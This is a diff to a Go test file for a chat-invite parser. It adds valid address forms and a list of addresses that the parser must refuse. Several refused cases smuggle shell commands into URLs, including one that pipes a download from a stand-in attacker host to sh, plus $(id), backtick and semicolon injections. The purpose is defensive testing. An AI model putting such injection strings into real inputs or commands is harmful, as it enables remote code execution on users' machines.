@@ -34,6 +34,9 @@ func TestAnInviteIsALinkOrACode(t *testing.T) {
 		"chat.example.com/join#PGTQRBXGTCDFFWBH":   {Instance: "https://chat.example.com", Code: "PGTQRBXGTCDFFWBH"},
 		"https://chat.example.com/join/#ABCD-EFGH": {Instance: "https://chat.example.com", Code: "ABCD-EFGH"},
 		"HTTPS://Chat.Example.com/join#ABCD":       {Instance: "https://Chat.Example.com", Code: "ABCD"},
+		// What an address is written with: a port, an IPv6 literal, a path, a name in another script.
+		"http://[fd00::1]:8080/n-o_r.i~te/join#ABCD": {Instance: "http://[fd00::1]:8080/n-o_r.i~te", Code: "ABCD"},
+		"https://café.example/join#ABCD":             {Instance: "https://café.example", Code: "ABCD"},
 	} {
 		got, err := ops.ParseInvite(raw)
 		require.NoError(t, err, raw)
@@ -61,6 +64,15 @@ func TestWhatIsNotAnInviteIsRefused(t *testing.T) {
 		"https://chat.example.com/a%23x/join#PGTQRBXGTCDFFWBH", // a fragment hidden in the path
 		"https://chat.example.com/a%2Fb/join#PGTQRBXGTCDFFWBH", // any encoding at all
 		"https://chat.example.com/it's/join#PGTQRBXGTCDFFWBH",  // a quote, which could not be printed back quoted
+		// What a shell reads, in an address printed back unquoted as part of a command to paste.
+		"https://chat.example.com/$(curl -s evil.example|sh)/join#PGTQRBXGTCDFFWBH",
+		"https://a$(id).example/join#PGTQRBXGTCDFFWBH",
+		"https://a;id;.example/join#PGTQRBXGTCDFFWBH",
+		"https://chat.example.com/`id`/join#PGTQRBXGTCDFFWBH",
+		"https://chat.example.com/a&b/join#PGTQRBXGTCDFFWBH",
+		"https://chat.example.com/a b/join#PGTQRBXGTCDFFWBH",
+		`https://chat.example.com/a"b/join#PGTQRBXGTCDFFWBH`,
+		`https://chat.example.com/a\b/join#PGTQRBXGTCDFFWBH`,
 		"PGTQ_RBXG",
 		"PGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHPGTQRBXGTCDFFWBHX", // past the bound
 	} {
